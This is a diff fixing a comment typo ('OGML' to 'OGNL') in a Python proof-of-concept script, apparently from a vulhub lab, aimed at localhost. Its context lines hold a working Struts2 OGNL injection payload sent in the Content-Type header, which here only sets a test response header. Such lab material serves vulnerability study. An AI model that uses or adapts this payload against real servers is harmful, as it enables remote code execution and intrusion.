@@ -3,7 +3,7 @@ import requests
 # Target URL
 url = "http://localhost:8080"
 
-# Put a malicious OGML expression into the Content-Type Header
+# Put a malicious OGNL expression into the Content-Type Header
 payload = "%{(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233))}.multipart/form-data"
 
 # Set the header
